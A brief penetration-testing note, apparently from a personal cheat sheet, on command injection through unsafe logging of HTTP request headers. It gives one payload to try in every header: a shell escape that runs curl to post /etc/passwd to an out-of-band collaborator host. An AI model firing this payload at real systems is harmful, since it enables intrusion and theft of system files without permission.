### unsafe logger
If an unsafe logger is used, an attacker can inject code and execute arbitrary commands, 
even if the page being accessed is a 404 page. 
Always test HTTP request headers to make sure the application is handling the headers correctly.
Try it every possible header
`";curl -X POST -d @/etc/passwd http://burp_collobrator.com/ #`
